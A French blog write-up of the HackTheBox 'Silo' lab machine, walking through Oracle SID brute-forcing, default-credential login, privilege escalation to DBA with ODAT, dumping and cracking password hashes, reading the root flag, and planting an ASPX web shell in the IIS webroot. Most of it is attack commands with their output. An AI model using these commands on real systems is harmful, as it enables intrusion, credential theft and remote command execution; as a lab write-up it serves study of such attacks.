# Solution du CTF Silo de HackTheBox

Le challenge CTF Silo de [Hack The Box](https://www.hackthebox.eu/) a été pour moi un CTF plutôt perturbant comme il a du l'être à tous ceux qui ne sont pas habitués à faire du pentest sur Oracle et/ou ceux pour qui Oracle est une vrai usine à gaz (et on ne pourra pas leur donner tort).  

Knock knock
-----------

On commence par l'habituel scan de port qui fait ressortir des listeners Oracle sur une machine Windows Server 2008 R2 :  

```plain
Nmap scan report for 10.10.10.82
Host is up (0.023s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-05-14 08:27:39
|_  start_date: 2018-05-14 06:12:51
```

**NB :** pour utiliser certains modules Metasploit et autres outils d'attaques visant le SGBD Oracle il faut avoir installé certains outils officiels. L'installation est relativement simple et expliquée par exemple [ici](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux).  

La première étape consiste à trouver des SID valides sur le listener. Et pour cela les outils ne manquent pas. On peut citer *Nmap* :  

```plain
root@kali:~# nmap -p 1521 --script oracle-sid-brute 10.10.10.82 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-28 20:53 CEST
Nmap scan report for 10.10.10.82
Host is up (0.026s latency).

PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-sid-brute: 
|_  XE

Nmap done: 1 IP address (1 host up) scanned in 97.09 seconds
```

Le non moins célèbre *Hydra* :  

```plain
root@kali:~# hydra -L sids.txt oracle-sid://10.10.10.82:1521
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-05-14 20:46:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 748 login tries (l:748/p:1), ~47 tries per task
[DATA] attacking oracle-sid://10.10.10.82:1521/
[STATUS] 552.00 tries/min, 552 tries in 00:01h, 196 to do in 00:01h, 16 active
[1521][oracle-sid] host: 10.10.10.82   login: XE
[1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc
1 of 1 target successfully completed, 2 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-05-14 20:47:58
```

Et bien sûr Metasploit fait le job :  

```plain
msf auxiliary(admin/oracle/sid_brute) > exploit

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
[*] 10.10.10.82:1521 - Done with brute force...
[*] Auxiliary module execution completed
```

Une fois que l'on a trouvé un SID valide on passe à la recherche d'un compte valide. Comme Oracle a quelques comptes par défaut ça ne devrait pas poser de problèmes, sauf que dans la pratique on se rend compte que *Nmap* ne parvient pas à nous trouver quoi que ce soit (modules *oracle-enum-users*, *oracle-brute* et *oracle-brute-stealth*), sans doute du à la version d'Oracle utilisée...  

On peut avoir plus de chances avec le module Metasploit, même s'il n'a pas fonctionné au premier coup dans mon cas (il faut aussi se rappeler que sur HTB, plusieurs personnes peuvent être en train de réaliser simultanément les même attaques) :  

```plain
msf auxiliary(admin/oracle/oracle_login) > exploit

[*] Starting brute force on 10.10.10.82:1521...
[+] Found user/pass of: scott/tiger on 10.10.10.82 with sid XE
[*] Auxiliary module execution completed
```

Now what ?
----------

Maintenant que l'on dispose d'un compte valide, que faire ? Il existe différentes failles connues pour l'*\*unbreakable\** Oracle qui sont très bien expliquées [chez HackMag](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/).  

L'outil de référence qui implémente la plupart des attaques sur Oracle c'est [ODAT: Oracle Database Attacking Tool](https://github.com/quentinhardy/odat/).  

Cet outil dispose d'une liste de commandes d'attaques décrivant les différentes actions que l'on peut effectuer via l'exploitation des vulnérabilités :   

```plain
				  Choose a main command
all               to run all modules in order to know what it is possible to do
tnscmd            to communicate with the TNS listener
tnspoison         to exploit TNS poisoning attack
sidguesser        to know valid SIDs
passwordguesser   to know valid credentials
utlhttp           to send HTTP requests or to scan ports
httpuritype       to send HTTP requests or to scan ports
utltcp            to scan ports
ctxsys            to read files
externaltable     to read files or to execute system commands/scripts
dbmsxslprocessor  to upload files
dbmsadvisor       to upload files
utlfile           to download/upload/delete files
dbmsscheduler     to execute system commands without a standard output
java              to execute system commands
passwordstealer   to get hashed Oracle passwords
oradbg            to execute a bin or script
dbmslob           to download files
stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
smb               to capture the SMB authentication
privesc           to gain elevated access
cve               to exploit a CVE
search            to search in databases, tables and columns
unwrapper         to unwrap PL/SQL source code (no for 9i version)
clean             clean traces and logs
```

La première chose à faire est de passer notre compte *SCOTT* en DBA. Ce compte ne l'est pas mais au vu de ses privilèges c'est tout comme :  

```plain
LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py privesc -s 10.10.10.82 -U scott -P tiger -d XE --get-privs

[1] (10.10.10.82:1521): Get system privileges and roles of current Oracle user
- role: CONNECT
	- system privege: CREATE CLUSTER
	- system privege: CREATE INDEXTYPE
	- system privege: CREATE OPERATOR
	- system privege: CREATE PROCEDURE
	- system privege: CREATE SEQUENCE
	- system privege: CREATE SESSION
	- system privege: CREATE TABLE
	- system privege: CREATE TRIGGER
	- system privege: CREATE TYPE
- role: RESOURCE
	- system privege: CREATE CLUSTER
	- system privege: CREATE INDEXTYPE
	- system privege: CREATE OPERATOR
	- system privege: CREATE PROCEDURE
	- system privege: CREATE SEQUENCE
	- system privege: CREATE SESSION
	- system privege: CREATE TABLE
	- system privege: CREATE TRIGGER
	- system privege: CREATE TYPE
```

Parmi les techniques d'escalade de privilèges Oracle supportées par ODAT l'une correspond à l'utilisation de CREATE PROCEDURE :  

```plain
LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py privesc -s 10.10.10.82 -U scott -P tiger -d XE --dba-with-execute-any-procedure --sysdba

[1] (10.10.10.82:1521): Grant DBA role to current user with CREATE/EXECUTE ANY PROCEDURE method
[+] The DBA role has been granted to this current user
```

J'ai lu sur le web qu'il fallait parfois déverrouiller le compte. Pour cela il faut se connecter avec *sqlplus* (*sqlplus scott/tiger@10.10.10.82/XE*) et rentrer la commande suivante (le début est bien sûr l'invite) :  

```plain
SQL> alter user scott account unlock;
```

On peut alors tester certaines commandes comme le *passwordstealer* :  

```plain
LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py passwordstealer -s 10.10.10.82 -d XE -U scott -P tiger  --get-passwords 

[1] (10.10.10.82:1521): Try to get Oracle hashed passwords
[+] Here are Oracle hashed passwords (some accounts can be locked):
SYS; FBA343E7D6C8BC9D; S:9665BEDD55BCDB06121B34917713A19F7C3AC2F34554781395D2560B1D1D
SYSTEM; B5073FE1DE351687; S:486D06A8C62E20F7BDE616E55889CD0A68AB8E6C7FCB86D16CB576441467
OUTLN; 4A3BA55E08595C81; S:142AD444D8A63983FF69C77DBFD3E60947C14237AEC71031E24F5228D44C
DIP; CE4A36B8E06CA59C; S:1E4C37D0E8DC2E556D3C02A961ACEF1500B315D076BE13E578D1A28FC757
ORACLE_OCM; 5A2E026A9157958C; S:1575D1C89A1AACFE161ED788D2DC59CF6C57AE3B6CCC341D831AAF5BC447
DBSNMP; E066D214D5421CCC; S:59354E99120C523F77232A8CCFDE5E780591FCE14109EEE2C86F4A9B4E8F
APPQOSSYS; 519D632B7EE7F63A; S:4237CCB702887B049107EE6D13C312123F40E3F51208B2B70D6DA92E621D
CTXSYS; D1D21CA56994CAB6; S:3548FDA49F84F2F7ECE4635BA0FD714EC2446723074ED6167F1CD9B6EDFB
XDB; E76A6BD999EF9FF1; S:88D6BE2B593143BD5AE5185C564826F9213E71361230D3360E36C3FF55D2
ANONYMOUS; anonymous; None
XS$NULL; DC4FCC8CB69A6733; S:6C4F97FF654AE30BCD9BDBB3007EF952B5943F0A9ED491455E9FB185D8A1
MDSYS; 72979A94BAD2AF80; S:F337C5D6300E3F8CDEDE0F2B2336415EAAE098A700A35E6731BF1370657E
HR; 4C6D73C3E8B0F0DA; S:F437C1647EBCEB1D1FB4BB3D866953B4BF612B343944B899E061B361F31B
FLOWS_FILES; 30128982EA6D4A3D; S:A3657555975A9F7527C4B97637734D74465C592B9D231CA3DAB100ED5865
APEX_PUBLIC_USER; 4432BA224E12410A; S:E8D8CCD600CBCEA08ACB158A502C5DA711B00146404621BB2F83E8997246
APEX_040000; E7CE9863D7EEB0A4; S:03D9B47D20C9A9EC3023177D80C0EE2D1DCEDA619215C2405177CEFFEE76
SCOTT; F894844C34402B67; S:16015028693BC0B4C82472A60D337F932B9AD86A3711D2F83967AF2DE20C
[+] Here are 10g Oracle hashed passwords for oclHashcat (some accounts can be locked):
FBA343E7D6C8BC9D:SYS
B5073FE1DE351687:SYSTEM
3A3BA55E08595C81:OUTLN
CE4A36B8E06CA59C:DIP
5A2E026A9157958C:ORACLE_OCM
E066D214D5421CCC:DBSNMP
519D632B7EE7F63A:APPQOSSYS
D1D21CA56994CAB6:CTXSYS
E76A6BD999EF9FF1:XDB
anonymous:ANONYMOUS
DC4FCC8CB69A6733:XS$NULL
72979A94BAD2AF80:MDSYS
4C6D73C3E8B0F0DA:HR
30128982EA6D4A3D:FLOWS_FILES
4432BA224E12410A:APEX_PUBLIC_USER
E7CE9863D7EEB0A4:APEX_040000
F894844C34402B67:SCOTT
```

Ces hash 10g sont cassables via hashcat. On les recopie dans un fichier et on lance hashcat de cette manière :  

```plain
hashcat -m 3100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

On se retrouve avec les comptes suivants :  

```plain
F894844C34402B67:SCOTT:TIGER                     
E76A6BD999EF9FF1:XDB:ORACLE                      
D1D21CA56994CAB6:CTXSYS:ORACLE                   
CE4A36B8E06CA59C:DIP:DIP
```

Mais plutôt que d'essayer au hasard les attaques supportées, ODAT est capable de détecter ce qu'il est possible d'exploiter sur le listener :  

```plain
[2] (10.10.10.82:1521): Testing all modules on the XE SID with the scott/tiger account
[2.1] UTL_HTTP library ?
[-] KO
[2.2] HTTPURITYPE library ?
[+] OK
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[-] KO
[2.5] DBMSADVISOR library ?
[+] OK
[2.6] DBMSSCHEDULER library ?
[-] KO
[2.7] CTXSYS library ?
[-] KO
[2.8] Hashed Oracle passwords ?
[+] OK
[2.9] Hashed Oracle passwords from history?
[-] KO
[2.10] DBMS_XSLPROCESSOR library ?
[+] OK
[2.11] External table to read files ?
[-] KO
[2.12] External table to execute system commands ?
[-] KO
[2.13] Oradbg ?
[-] KO
[2.14] DBMS_LOB to read files ?
[+] OK
[2.15] SMB authentication capture ?
[-] KO
[2.16] Gain elevated access (privilege escalation)?
[+] The current user has already DBA role. It does not need to exploit a privilege escalation!
[2.17] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[2.18] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database
```

Dès lors il suffit de croiser ces informations avec les descriptions vues plus tôt pour par exemple pouvoir télécharger un fichier du système.  

```plain
LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger  --getFile 'c:/Users/Administrator/Desktop' root.txt /tmp/root.txt

[1] (10.10.10.82:1521): Read the root.txt file stored in c:/Users/Administrator/Desktop on the 10.10.10.82 server
[+] Data stored in the root.txt file sored in c:/Users/Administrator/Desktop (copied in /tmp/root.txt locally):
cd39ea0af657a495e33bc59c7836faf6
```

On dispose déjà du flag root :)  

Dégringolade de privilèges
--------------------------

C'est bien beau mais ironiquement il nous manque le *user.txt* et on ne connait pas le nom de l'utilisateur non privilégié.  

Il est temps de voir si on peut utiliser ODAT pour écrire un fichier sur la racine web (puisqu'un serveur IIS tourne) :  

```plain
LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2/ ./odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger  --putFile 'c:/inetpub/wwwroot' test_xxx.txt test_xxx.txt

[1] (10.10.10.82:1521): Put the test_xxx.txt local file in the c:/inetpub/wwwroot folder like test_xxx.txt on the 10.10.10.82 server
[+] The test_xxx.txt file was created on the c:/inetpub/wwwroot directory on the 10.10.10.82 server like the test_xxx.txt file
```

Et quand on pointe notre browser sur http://10.10.10.82/test\_xxx.txt... bingo il est présent !  

J'ai alors uploadé [cette backdoor ASPX](https://github.com/fuzzdb-project/fuzzdb/blob/master/web-backdoors/asp/cmdasp.aspx) qui nous offre une sympathique exécution de commande.  

![HackTheBox Silo ASPX webshell](https://raw.githubusercontent.com/devl00p/blog/master/images/silo_webshell.png)

Avec ça on peut accéder au flag de l'utilisateur *Phineas* : *92ede778a1cc8d27cb6623055c331617.*  

Conclusion
----------

Ce fut un CTF intéressant qui une fois de plus n'aurait pas pu être proposé sous la forme d'une VM (en raisons des logiciels propriétaires utilisés).  

Grace à ODAT terrasser l'*incassable* (tm) Oracle n'aura pas été compliqué :D

*Published August 04 2018 at 19:31*